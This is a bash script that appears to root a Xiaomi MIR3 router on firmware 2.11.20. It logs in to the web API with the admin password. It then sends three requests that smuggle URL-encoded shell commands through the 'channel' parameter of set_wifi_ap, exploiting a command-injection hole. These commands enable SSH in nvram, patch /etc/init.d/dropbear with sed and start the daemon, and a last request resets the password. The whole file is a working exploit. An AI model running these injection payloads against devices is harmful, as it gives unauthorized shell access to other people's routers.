#!/bin/bash
if [ "$#" -ne 2 ]; then
  echo -e "Usage: ./flasher ROUTER_IP PASSWORD\n";
  echo "Prerequisites: ";
  echo "  Must be on firmware 2.11.20 Chinese version";
  echo "  Must have completed initial router setup";
  exit 0;
fi

# Check for router hardware and software
echo -e  "\e[1m\e[32m==>\e[0m Checking Router Version...";
echo -ne "  \e[1m\e[34m->\e[0m Step 1/1... ";
RESULT=$(curl -s "$1/cgi-bin/luci/web")
if [[ $RESULT != *"romVersion: '2.11.20'"* || $RESULT != *"romChannel: 'stable'"*  || $RESULT != *"hardwareVersion: 'R3'"* ]]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Did not find MIR3 version 2.11.20";
  exit 1;
fi
echo "OK";

# Fetch Device ID and Key for password hashing
echo -e  "\e[1m\e[32m==>\e[0m Authenticating and Generating STOK...";
echo -ne "  \e[1m\e[34m->\e[0m Step 1/2... ";
DEVICE_ID=$(curl -s "$1/cgi-bin/luci/web" | grep -oP "var deviceId = '\K([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}(?=')");
KEY=$(curl -s "$1/cgi-bin/luci/web" | grep -oP "key: '\K[0-9a-f]{32}(?=')");
if [ -z $DEVICE_ID ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Could not find device ID in html";
  exit 1;
fi
if [ -z $KEY ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Could not find key in html";
  exit 1;
fi

# Generate a convincing NONCE
NONCE=0_"$DEVICE_ID"_$(date +%s)_$((RANDOM % 10000));
if [ -z $NONCE ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Could not generate NONCE";
  exit 1;
fi
echo "OK";

# Auth and fetch STOK
echo -ne "  \e[1m\e[34m->\e[0m Step 2/2... ";
PASSWORD=$(echo -n "$2$KEY" | sha1sum | cut -d " " -f 1);
PASSWORD=$(echo -n "$NONCE$PASSWORD" | sha1sum | cut -d " " -f 1);
RESULT=$(curl -s "http://$1/cgi-bin/luci/api/xqsystem/login" --data "username=admin&password=$PASSWORD&logtype=2&nonce=${NONCE//:/%3A}");
STOK=$(echo "$RESULT" | grep -oP "\"token\":\"\K[0-9a-f]{32}(?=\")");
if [ -z $STOK ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Did not receive STOK";
  echo -e "  \e[1m\e[34m->\e[0m Response: $RESULT";
  echo -e "  \e[1m\e[34m->\e[0m Try checking the password";
  exit 1;
fi
echo "OK";

echo -e  "\e[1m\e[32m==>\e[0m Gaining SSH Access...";
# Step 1
echo -ne "  \e[1m\e[34m->\e[0m Step 1/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$STOK/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit");
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 2
echo -ne "  \e[1m\e[34m->\e[0m Step 2/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$STOK/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear");
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 3
echo -ne "  \e[1m\e[34m->\e[0m Step 3/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$STOK/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start")
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 4
echo -ne "  \e[1m\e[34m->\e[0m Step 4/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$STOK/api/xqsystem/set_name_password?oldPwd=password&newPwd=password")
if [ "$RESULT" != "{\"code\":0}" ]; then
  echo "ERR!";
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"code\":0}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

echo -ne "  \e[1m\e[34m->\e[0m Script Complete! SSH Access Obtained!";

#echo -e  "\e[1m\e[32m==>\e[0m Flashing Firmware...";

#echo -e  "\e[1m\e[32m==>\e[0m Flashing Complete!";
